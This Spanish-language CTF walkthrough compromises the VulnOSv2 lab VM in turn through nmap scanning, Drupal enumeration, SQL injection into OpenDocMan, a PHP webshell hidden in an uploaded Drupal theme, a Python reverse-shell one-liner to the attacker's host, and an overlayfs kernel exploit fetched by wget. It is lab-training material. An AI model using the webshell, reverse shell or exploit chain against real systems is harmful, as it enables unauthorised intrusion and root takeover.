# VulnOSv2
Desarrollo del CTF VulnOSv2. Download: https://www.vulnhub.com/entry/vulnos-2,147/

## Configuración.
- La máquina virtual no funciona en VMWARE, está preparada para VIRTUALBOX. 
- Debemos convertir VDI to VMDK para poder ser utilizado con VMWARE.
```
C:\VirtualBox>VBoxManage.exe C:\Users\PALOMO\Downloads\VulnOSv2\VulnOSv2.vdi C:\Users\OM4R\Downloads\VulnOSv2\VulnOSv2.vmdk --format VMDK
```
- Finalmente, se crea una máquina virtual del tipo UBUNTU y seleccionar el disco duro VMDK.

## Escaneo de Puertos

### 1. Escaneamos todos los puertos TCP

```
nmap -n -P0 -p- -sC -sV -O -T5 -oA full 192.168.78.141
Nmap scan report for 192.168.78.141
Host is up (0.00082s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 f5:4d:c8:e7:8b:c1:b2:11:95:24:fd:0e:4c:3c:3b:3b (DSA)
|   2048 ff:19:33:7a:c1:ee:b5:d0:dc:66:51:da:f0:6e:fc:48 (RSA)
|   256 ae:d7:6f:cc:ed:4a:82:8b:e8:66:a5:11:7a:11:5f:86 (ECDSA)
|_  256 71:bc:6b:7b:56:02:a4:8e:ce:1c:8e:a6:1e:3a:37:94 (ED25519)
80/tcp   open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: VulnOSv2
6667/tcp open  irc     ngircd
MAC Address: 00:0C:29:F2:88:85 (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: Host: irc.example.net; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


## 2. Enumeración de servicios.

### 2.1. Servicio WEB.
- Identificamos que el portal es un CMS DRUPAL: http://192.168.78.141/jabc/

<img src="https://github.com/El-Palomo/VulnOSv2/blob/main/VulnOS1.jpg" width="80%"></img>

- GoBuster no arroja resultados importantes.
<img src="https://github.com/El-Palomo/VulnOSv2/blob/main/VulnOS2.jpg" width="80%"></img>

- Buscamos vulnerabilidades en DRUPAL

```
droopescan scan drupal -u http://192.168.78.141/jabc/
[+] Plugins found:                                                              
    ctools http://192.168.78.141/jabc/sites/all/modules/ctools/
        http://192.168.78.141/jabc/sites/all/modules/ctools/CHANGELOG.txt
        http://192.168.78.141/jabc/sites/all/modules/ctools/LICENSE.txt
        http://192.168.78.141/jabc/sites/all/modules/ctools/API.txt
    token http://192.168.78.141/jabc/sites/all/modules/token/
        http://192.168.78.141/jabc/sites/all/modules/token/README.txt
        http://192.168.78.141/jabc/sites/all/modules/token/LICENSE.txt
    views http://192.168.78.141/jabc/sites/all/modules/views/
        http://192.168.78.141/jabc/sites/all/modules/views/README.txt
        http://192.168.78.141/jabc/sites/all/modules/views/LICENSE.txt
    libraries http://192.168.78.141/jabc/sites/all/modules/libraries/
        http://192.168.78.141/jabc/sites/all/modules/libraries/CHANGELOG.txt
        http://192.168.78.141/jabc/sites/all/modules/libraries/README.txt
        http://192.168.78.141/jabc/sites/all/modules/libraries/LICENSE.txt
    entity http://192.168.78.141/jabc/sites/all/modules/entity/
        http://192.168.78.141/jabc/sites/all/modules/entity/README.txt
        http://192.168.78.141/jabc/sites/all/modules/entity/LICENSE.txt
    ckeditor http://192.168.78.141/jabc/sites/all/modules/ckeditor/
        http://192.168.78.141/jabc/sites/all/modules/ckeditor/CHANGELOG.txt
        http://192.168.78.141/jabc/sites/all/modules/ckeditor/README.txt
        http://192.168.78.141/jabc/sites/all/modules/ckeditor/LICENSE.txt
    rules http://192.168.78.141/jabc/sites/all/modules/rules/
        http://192.168.78.141/jabc/sites/all/modules/rules/README.txt
        http://192.168.78.141/jabc/sites/all/modules/rules/LICENSE.txt
    addressfield http://192.168.78.141/jabc/sites/all/modules/addressfield/
        http://192.168.78.141/jabc/sites/all/modules/addressfield/LICENSE.txt
    plupload http://192.168.78.141/jabc/sites/all/modules/plupload/
        http://192.168.78.141/jabc/sites/all/modules/plupload/CHANGELOG.txt
        http://192.168.78.141/jabc/sites/all/modules/plupload/README.txt
        http://192.168.78.141/jabc/sites/all/modules/plupload/LICENSE.txt
    commerce http://192.168.78.141/jabc/sites/all/modules/commerce/
        http://192.168.78.141/jabc/sites/all/modules/commerce/README.txt
        http://192.168.78.141/jabc/sites/all/modules/commerce/LICENSE.txt
    profile http://192.168.78.141/jabc/modules/profile/
    php http://192.168.78.141/jabc/modules/php/
    image http://192.168.78.141/jabc/modules/image/

[+] Themes found:
    seven http://192.168.78.141/jabc/themes/seven/
    garland http://192.168.78.141/jabc/themes/garland/

[+] Possible version(s):
    7.22
    7.23
    7.24
    7.25
    7.26
```
<img src="https://github.com/El-Palomo/VulnOSv2/blob/main/VulnOS3.jpg" width="80%"></img>

- Busqué vulnerabilidades de manera manual en los plugins y no encontré nada.
- Busqué vulnerabilidades en EXPLOIT-DB y todas las que probé no funcionaron. Frustrante, invertí mucho tiempo en la vuln. DRUPALGDEDDON.

<img src="https://github.com/El-Palomo/VulnOSv2/blob/main/VulnOS4.jpg" width="80%"></img>

- Última opción, buscar MENSAJES en el código HTML. En la página http://192.168.78.141/jabc/?q=node/7 hay un mensaje exclusivamente para el CTF.
- Moraleja: Buscar siempre en el código HTML.

<img src="https://github.com/El-Palomo/VulnOSv2/blob/main/VulnOS5.jpg" width="80%"></img>
<img src="https://github.com/El-Palomo/VulnOSv2/blob/main/VulnOS6.jpg" width="80%"></img>


## 3. Explotando Vulnerabilidades

- El portal es un sistema que se llama OPENDOCMAN v1.2.7 (parece un sistema de versionamiento de documentos). 
- Buscamos en Google y de inmediato aparecen vulnerabilidades en EXPLOIT-DB.
- 02 vulnerabilidades: SQLi y elevar privilegios. SQLi parece super facil.
<img src="https://github.com/El-Palomo/VulnOSv2/blob/main/VulnOS7.jpg" width="80%"></img>

<img src="https://github.com/El-Palomo/VulnOSv2/blob/main/VulnOS8.jpg" width="80%"></img>


### Explotando SQLi

- La inyección esta sencilla.
<img src="https://github.com/El-Palomo/VulnOSv2/blob/main/VulnOS9.jpg" width="80%"></img>

- El usuario configurado de acceso a la BASE DE DATOS es ROOT. De inmediato pienso que puedo enumerar información de la BD y cargar archivos al servidor.

<img src="https://github.com/El-Palomo/VulnOSv2/blob/main/VulnOS10.jpg" width="80%"></img>

- Debido a que esta super facil utilizamos SQLMAP y eumeramos todo lo posible:

#### Enumeración de información en BASE DE DATOS:

> La contraseña del usuario root de la BD es: toor

<img src="https://github.com/El-Palomo/VulnOSv2/blob/main/VulnOS11.jpg" width="80%"></img>
<img src="https://github.com/El-Palomo/VulnOSv2/blob/main/VulnOS12.jpg" width="80%"></img>

> En la tabla ODM_USER de la base de datos "jabcd0cs" encontramos dos (02) HASH MD5. El hash corresponde al pass: webmin1980 y usuario: webadmin

<img src="https://github.com/El-Palomo/VulnOSv2/blob/main/VulnOS13.jpg" width="80%"></img>
<img src="https://github.com/El-Palomo/VulnOSv2/blob/main/VulnOS14.jpg" width="80%"></img>

> En la base de datos DRUPAL7 encontré información del usuario webmin, este usuario ya lo había encontrado en el la aplicación OPENDOCMAN. 
> Con el usuario webmin puede entrar al DRUPAL. Bingo!

<img src="https://github.com/El-Palomo/VulnOSv2/blob/main/VulnOS15.jpg" width="80%"></img>
<img src="https://github.com/El-Palomo/VulnOSv2/blob/main/VulnOS16.jpg" width="80%"></img>

### Cargando una WEBSHELL

- Cuando se logra acceso a un CMS una manera rápida y fácil de lograr shell es cargar una WEBSHELL a través de un THEME. Vamos a hacerlo rápido.
1. Descargo cualquiere THEME, solo hay que tener en consideración que sea para la versiónj 7 de DRUPAL. https://www.drupal.org/project/zen 
2. Lo descomprimo y añado un script en PHP. El más básico posible, que contenga la función SYSTEM.
3. Lo vuelvo a comprimir y cargo el nuevo THEME.

```
<?php
system($_GET['cmd']);
?>
```
<img src="https://github.com/El-Palomo/VulnOSv2/blob/main/VulnOS17.jpg" width="80%"></img>

### Ejecutamos la WEBSHELL y obtener consola

```
http://192.168.78.141/jabc/sites/all/themes/zen-7.x-6.4/zen/cmd.php?cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.78.131",666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

/* En la consola de KALI */
root@kali:/home/kali/Downloads/zen# netcat -lvp 666
Connection from 192.168.78.141:43517
/bin/sh: 0: can't access tty; job control turned off
$ 
```
<img src="https://github.com/El-Palomo/VulnOSv2/blob/main/VulnOS18.jpg" width="80%"></img>


## 4. Elevar privilegios

> Ahora que ya tenemos una webshell para elevar privilegios busqué a través de los siguientes vectores:
1. SUDO
2. LLAVES SSH
3. SUID
4. Archivos de configuración

> Ninguno me brindó información relevante. Sólo me quedaba buscar en la versión de KERNEL y asi eleve privilegios.

### 4.1. Identificar la versión exacta del sistema operativo.

```
webmin@VulnOSv2:/tmp$ cat /etc/lsb-release
cat /etc/lsb-release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=14.04
DISTRIB_CODENAME=trusty
DISTRIB_DESCRIPTION="Ubuntu 14.04.4 LTS"
webmin@VulnOSv2:/tmp$ uname -a
uname -a
Linux VulnOSv2 3.13.0-24-generic #47-Ubuntu SMP Fri May 2 23:31:42 UTC 2014 i686 i686 i686 GNU/Linux
```
Nota: Ingrese con el usuario webmin con las mismas contraseñas encontradas antes.


### 4.2. Buscamos algun exploit para la versión del KERNEL
```
root@kali:~# searchsploit 3.13.0
----------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                 |  Path
----------------------------------------------------------------------------------------------- ---------------------------------
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Esca | linux/local/37292.c
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Esca | linux/local/37293.txt
----------------------------------------------------------------------------------------------- ---------------------------------
```
> Ambos parecen candidatos fuertes asi que probaré en orden. El primero funcionó super bien.
> 

```
/* En KALI */
root@kali:~# cp /usr/share/exploitdb/exploits/linux/local/37292.c /var/www/html/
root@kali:~# cp /usr/share/exploitdb/exploits/linux/local/37293.txt /var/www//html/
root@kali:~# /etc/init.d/apache2 start
Starting apache2 (via systemctl): apache2.service.


/* En VULNOS */

webmin@VulnOSv2:/tmp$ wget http://192.168.78.131/37292.c 
wget http://192.168.78.131/37292.c 
--2021-02-27 04:52:33--  http://192.168.78.131/37292.c
Connecting to 192.168.78.131:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5119 (5.0K) [text/x-csrc]
Saving to: ‘37292.c’

100%[======================================>] 5,119       --.-K/s   in 0s      

webmin@VulnOSv2:/tmp$ gcc -o r00t 37292.c
webmin@VulnOSv2:/tmp$ chmod +x r00t
chmod +x r00t
webmin@VulnOSv2:/tmp$ ./r00t
./r00t
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# id
id
uid=0(root) gid=0(root) groups=0(root),1001(webmin)

```
<img src="https://github.com/El-Palomo/VulnOSv2/blob/main/VulnOS19.jpg" width="80%"></img>



